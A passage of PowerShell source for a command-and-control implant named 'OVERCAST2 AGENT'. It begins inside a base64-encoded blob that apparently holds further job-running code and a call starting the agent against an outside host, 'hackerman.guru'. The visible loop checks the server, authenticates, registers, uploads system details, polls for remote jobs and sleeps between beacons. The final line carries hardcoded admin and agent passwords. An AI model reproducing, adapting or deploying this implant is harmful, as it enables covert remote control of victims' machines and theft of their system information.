QXBpS2V5ICRhZ2VudC5BcGlLZXkgLUpvYklEICRKb2JJRC5pZCAtQWdlbnRJRCAkYWdlbnQuSUQNCiAgICAgICAgICAgICAgICAgICAgICAgICRnb3Rqb2IgPSAkam9iLkdKQkkoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGdvdGpvYiAtZXEgInRydWUiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRqb2JzICs9ICRqb2INCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBpZigkam9icy5jb3VudCAtZ3QgMCl7DQogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkam9iIGluICRqb2JzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRqb2Jjb21wbGV0ZSA9ICRqb2IuUm5DKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkam9iY29tcGxldGUgLWVxICJ0cnVlIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRqb2IuU0NSKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICRhZ2VudC5TbHAoKQ0KICAgIH0NCg0KfQ0KU3RhcnQtQWdlbnQgLVVybCAiaHR0cHM6Ly9oYWNrZXJtYW4uZ3VydS9vdmVyY2FzdC9wdWJsaWMvIiAtS2V5ICI1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OSI="}' -AuthToken "NONE"
    # $j.Run()



    # This will loop until killed is set to true
    "OVERCAST2 AGENT IS STARTING..."
    while($agent.Killed -eq 0)
    {
        "-------------------------------------------------------------------"
        # Check that the server responds before progressing
        "CHECKING IF SERVER IS ONLINE..."
        if ( $agent.ServerOnline() ){
            "ATTEMPING TO AUTHORISE WITH SERVER"
            if(!$agent.CheckAuth()){
                "AGENT NOT AUTHED"
                "AUTHORISING"
                if($agent.Auth()){
                    "AUTHORISED AND TOKEN RETURNED"
                } else {
                    "NOT AUTHORISED"
                }
            } else {
                "AUTHORISED"
                "CHECKING IN"
                if(!$agent.CheckIn()){
                    "CHECK IN FAILED, NO AGENT WITH THAT ID"
                    "REGISTERING AGENT"
                    if($agent.Register()){
                        "AGENT REGISTERED"
                        "PERFORMING INITIAL UPDATE"
                        "UPDATEDING SYSTEM DETAILS"
                        if($agent.GtSysDts()){
                            if($agent.Update()){
                                "AGENT DETAILS UPLOADED"
                            } else {
                                "FAILED TO UPLOAD AGENT DETAILS"
                            }
                        } else {
                            "FAILED TO UPLOAD AGENT DETAILS"
                        }                        
                    } else {
                        "FAILED TO REGISTER AGENT"
                    }
                } else {
                    "CHECKED IN"
                    "CHECKING FOR JOBS"
                    if ($agent.HasJobs) {
                        "AGENT HAS JOBS WAITING TO BE RETRIEVED"
                        "RETRIEVING JOBS"
                        $jobs = $agent.GetJobs()
                        # if ($jobs) {
                        #     "SUCCESSFULLY RETRIEVED JOBS"
                        #     $jobs
                        #     # foreach ($job in $jobs)
                        #     # {
                        #     #     $j = Create-Job -JobID $job.id -AgentID $agent.ID -JobType $job.job_type -HandlerUrl $agent.HandlerUrl -Command $job.command -AuthToken $agent.AuthToken
                        #     #     $j.Run()
                        #     # }
                        # } else {
                        #     "FAILED TO RETRIEVE JOBS"
                        # }
                    } else {
                        "NO JOBS"
                    }
                }
            }
        } else {
            "UNABLE TO CONNECT TO SERVER!"
        }
        "SLEEPING"
        Start-Sleep -milliseconds $agent.SleepTime
    }


}
Start-Agent -Url "http://localhost:3000/api" -ServerUser "Admin" -ServerPass "Ov3rC4stPas5_67!" -Password "AgentPassword!"